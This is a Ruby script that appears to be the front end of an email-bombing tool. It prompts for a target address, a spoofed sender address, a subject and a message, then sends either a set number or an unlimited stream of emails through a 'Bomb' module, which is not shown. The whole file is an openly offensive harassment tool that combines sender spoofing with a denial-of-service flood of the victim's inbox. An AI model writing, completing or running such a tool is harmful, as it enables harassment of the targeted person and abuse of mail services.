# Load Modules
require "open-uri"
$LOAD_PATH << '.'
require "modules/bomb.rb"
require "modules/welcome_message.rb"
require "modules/clear.rb"

# Startup Prep
Clear.cls or Clear.clear
Welcome.msg

# Input
puts "Would you like to send infinite emails, or a set amount?"
print "Type 'set' or 'infinite': "
type = gets.chomp.downcase
print "Target Email: "
target = gets.chomp
print "Spoofed Email: "
email = gets.chomp
print "Subject: "
subject = gets.chomp
print "Message: "
message = gets.chomp

# Type Conditional
if type == "set"
	print "Number of Emails: "
	amount = gets.chomp.to_i
	Bomb.input(email, target, subject, message, amount)
	Clear.cls or Clear.clear
elsif type == "infinite"
	Bomb.infinite(email, target, subject, message)
	Clear.cls or Clear.clear
else
	puts "Not a valid option, options include 'set' and 'infinite'."
end
